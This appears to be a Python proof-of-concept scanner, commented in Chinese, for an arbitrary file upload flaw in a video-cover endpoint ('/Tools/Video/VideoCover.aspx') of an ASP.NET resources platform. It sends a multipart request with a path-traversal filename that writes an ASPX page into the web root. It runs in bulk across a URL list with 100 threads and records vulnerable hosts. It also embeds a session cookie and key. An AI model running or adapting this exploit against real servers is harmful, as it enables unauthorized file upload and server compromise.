import argparse  # 用于解析命令行参数
import sys  # 提供对解释器使用或影响解释器的函数和变量的访问
import requests  # 用于发送HTTP请求
import re  # 正则表达式模块，用于字符串匹配和操作
import time  # 提供时间相关的功能
from multiprocessing.dummy import Pool  # 使用线程池来并行处理任务
requests.packages.urllib3.disable_warnings()  # 禁用requests库中的警告
def main():
    parser = argparse.ArgumentParser(description="J_C")
    parser.add_argument('-u', '--url', dest='url', type=str, help="input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []  
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")
def poc(target):
    payload_url = '/Tools/Video/VideoCover.aspx'
    url = target + payload_url
    header = {
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insectre-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Language': 'zh-CN,zh;g=0.9',
            'Cookie': 'ASP.NET_SessionId=pgfnw0patx4kh0jsnpjgzcmq; PrivateKey=f09020eaf656f9cf5d9292d39c296d1c',
            'Connection': 'close',
            'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M',
            'Content-Length': '294'
    }
    data = '''------WebKitFormBoundaryVBf7Cs8QWsfwC82M
Content-Disposition: form-data, name= "file";filename="/../../../AVA.ResourcesPlatform.WebUI/test.aspx"
Content-Type: image/jpeg
 
<%@Page Language="C#"%>
<%
Response.Write("test");
%>
------WebKitFormBoundaryVBf7Cs8QWsfwC82M--'''
    try:
        res1 = requests.get(url=target, headers=header, timeout=10)
        if res1.status_code == 200:
            res2 = requests.post(url=url, headers=header,data=data,timeout=10)
            if "Success" in res2.text:
                print(f'[+] 该URL存在漏洞,地址为{target}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + "\n")
            else:
                print(f'[-] 该URL{target}不存在漏洞')
    except Exception as e:
        print(f'[*] 该URL{target}存在访问问题，请手工测试')

if __name__ == '__main__':
    main()
